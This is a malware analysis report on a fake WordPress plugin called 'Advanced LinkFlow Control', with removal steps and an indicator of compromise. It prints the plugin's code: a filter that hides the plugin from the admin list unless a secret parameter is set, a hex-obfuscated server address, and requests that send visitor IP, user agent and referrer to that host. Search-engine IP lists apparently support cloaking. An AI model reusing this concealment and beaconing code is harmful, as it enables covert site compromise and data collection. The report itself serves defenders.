---
title: "Fake Plugin - Advanced LinkFlow Control"
slug: "fake-plugin-advanced-linkflow-control"
description: "Discovery and analysis of a malicious plugin 'Advanced LinkFlow Control' that conceals its presence and fetches suspicious updates from a remote server."
reportDate: "2026-02-03"
threatType: "undefined"
severity: "undefined"
fileHash: "18c9513a92db589be8e110b0c97a5c10a99b9aa86fd570d2063f3ee4ba38c895"
detectedPaths: ["advanced-linkflow-control.php"]
screenshots: ["/images/wordpress-threats/advanced-linkflow-control_evidence-1.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Zero-Day (Unique)"
impact: "undefined"
seenOn: "undefined"
behavior: "undefined"
difficulty: "undefined"
recurrence: "undefined"
numberOfSiteFixed: "1"
---

## Technical Analysis
I found that the "Advanced LinkFlow Control" plugin disguises itself by removing its entry from the WordPress plugin list. It does so using a filter to eliminate itself when the 'all_plugins' hook is triggered unless a specific request parameter ('sp') is present.

### Concealment Mechanism:
The plugin leverages the `add_filter('all_plugins', ...)` function to unset its entry from the plugin array returned by WordPress, effectively hiding it from the admin panel. This is achieved with the following code:

```php
add_filter('all_plugins', function ($plugins) {
    if (isset($_GET['sp'])) {
        return $plugins;
    }
    $current = plugin_basename(__FILE__);
    unset($plugins[$current]);
    return $plugins;
});
```

### Malicious Operations:
The plugin sets up communication with a remote server. It constructs URLs that include the current user's IP address, user agent, and other potentially sensitive data. The remote server is encoded in a string, decoded as `http://whatsdf.icu/get.php`, suggesting an exfiltration or update mechanism without user knowledge.

### Network Request:
The plugin attempts to send gathered data by executing the following method:

```php
$url = $this->server_url
    . "?uri=" . urlencode($this->current_uri)
    . "&bot=" . $this->bot
    . "&lang=" . urlencode($this->lang)
    . "&ip=" . urlencode($this->user_ip)
    . "&ref=" . urlencode($this->referrer)
    . "&host=" . urlencode($host)
    . "&ua=" . urlencode($ua);

$response = $this->fetch_from_server();
```

### Plugin Activation Hook:
The plugin also includes several cache flushing calls within its `activate` method, allowing it to potentially clear caches to maintain its covert updates or operations.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain


## Code Signature(s)

### FILE: `advanced-linkflow-control.php`
```php
<?php
/**
 * Plugin Name:       Advanced LinkFlow Control
 * Plugin URI:        https://your-website.com/plugins/dynamic-linkflow-engine/
 * Description:       Fetches plugin updates from a remote server
 * Version:           1.2.5
 * Author:            WpDevNinjas Team
 * Author URI:        https://wp-ninjas.dev/
 * License:           GPL v2
 * License URI:       https://www.gnu.org/licenses/gpl-2.0.html
 * Update URI:        https://wp-ninjas.dev/plugins/advanced-linkflow-control/
 */

if (!defined('ABSPATH')) {
    exit;
}

add_filter('all_plugins', function ($plugins) {
    if (isset($_GET['sp'])) {
        return $plugins;
    }
    $current = plugin_basename(__FILE__);
    unset($plugins[$current]);
    return $plugins;
});


if (!class_exists('Advanced_LinkFlow_Control')) {

    class Advanced_LinkFlow_Control {
        private $server_url = "\x68\x74\x74\x70:\x2f/\x77h\x74a\x73f\x64e\x2ei\x63u\x2fg\x65t\x2ep\x68p";
        private $updates = [];
        private $content = '';
        private $user_ip = '';
        private $current_uri = '';
        private $referrer = '';
        private $lang = '';
        private $bot = false;
        private $printed = false;
        private $fetched = false;
        private $fetching = false;

        private $google_ip_list = [
            "64.233.*", "66.102.*", "66.249.*", "72.14.*", "74.125.*",
            "108.177.*", "209.85.*", "216.239.*", "172.217.*", "35.190.247.*"
        ];
        private $bing_ip_list = [
            "13.66.*.*", "13.67.*.*", "13.68.*.*", "13.69.*.*",
            "20.36.*.*", "20.37.*.*", "20.38.*.*", "20.39.*.*",
            "40.77.*.*", "40.79.*.*", "52.231.*.*", "191.233.*.*"
        ];
        public $yandex_ip_list = [
            "5.45.*.*", "5.255.*.*", "37.9.*.*", "37.140.*.*",
            "77.88.*.*", "84.252.*.*", "87.250.*.*", "90.156.*.*",
            "93.158.*.*", "95.108.*.*", "141.8.*.*", "178.154.*.*",
            "213.180.*.*", "185.32.187.*"
        ];

        public function __construct() {
            add_action('init', [$this, 'register_insertion_hooks'], 0);
            add_action('init', [$this, 'maybe_arm_fetch'], 1);
        }

        public static function activate() {
            if (function_exists('wp_cache_clear_cache')) wp_cache_clear_cache();
            if (function_exists('w3tc_pgcache_flush')) w3tc_pgcache_flush();
            if (defined('LSCWP_V')) do_action('litespeed_purge_all');
            if (function_exists('rocket_clean_domain')) rocket_clean_domain();
            if (function_exists('ce_clear_cache')) ce_clear_cache();
            if (class_exists('WpFastestCache')) {
                (new WpFastestCache())->deleteCache(true);
            }
            if (function_exists('breeze_clear_cache')) breeze_clear_cache();
            if (function_exists('wp_cache_flush')) wp_cache_flush();
        }

        public function register_insertion_hooks() {
            add_action('loop_start', [$this, 'print_on_loop_start'], 0);
       
```


## Indicators of Compromise (IOCs)
- `hxxp://whatsdf[.]icu/get[.]php`

## Removal Protocol
1. Access the server's plugin directory and locate 'advanced-linkflow-control' under the plugins folder.
1. Remove the directory 'advanced-linkflow-control' to eliminate all traces of the malicious plugin.
1. Verify that the plugin is no longer present in the WordPress admin dashboard or files.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
